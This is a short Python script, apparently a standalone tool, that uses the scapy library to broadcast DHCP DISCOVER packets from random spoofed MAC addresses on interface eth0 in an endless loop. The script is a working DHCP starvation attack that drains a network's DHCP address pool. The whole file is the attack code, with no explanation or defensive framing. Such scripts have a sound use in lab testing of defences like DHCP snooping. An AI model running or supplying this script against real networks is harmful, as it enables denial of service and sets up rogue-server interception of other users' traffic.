from scapy.all import *
import time

conf.checkIPaddr=False

try:
    while 1:
        src_mac = str(RandMAC())
        #print(src_mac)
        packet = Ether(dst = 'ff:ff:ff:ff:ff:ff', src = src_mac, type = 0x800) /\
                 IP(src = "0.0.0.0", dst = "255.255.255.255") /\
                 UDP(sport = 68, dport = 67) /\
                 BOOTP(chaddr = src_mac, ciaddr = '0.0.0.0', flags = 0x1) /\
                 DHCP(options = [("message-type", "discover"), "end"])
        sendp(packet, iface = 'eth0', verbose = 0)
        time.sleep(1)
except KeyboardInterrupt:
    pass